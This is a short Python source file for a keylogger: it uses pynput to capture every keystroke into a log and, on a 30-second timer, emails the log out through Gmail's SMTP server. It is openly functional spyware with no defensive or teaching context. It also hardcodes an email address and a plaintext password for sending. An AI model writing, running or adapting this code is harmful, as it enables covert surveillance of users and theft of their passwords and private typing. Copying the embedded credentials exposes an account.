from pynput import keyboard
import time
import smtplib
import threading

log=""

def callback_function(key):
    global log
    try:
        log=log+str(key.char)
    except AttributeError:
        if key== key.space:
            log=log+" "
        else:
            log=log+str(key)
    except:
        pass

    print(log)

def send_email(email,password,log):
    email_server=smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,log)
    email_server.quit()


keylogger_listener=keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    send_email("2204257028@nku.edu.tr","Parola2020",log.encode("utf-8"))
    log=""
    timer_object= threading.Timer(30,thread_function)
    timer_object.start()

with keylogger_listener:
    thread_function()
    keylogger_listener.join()



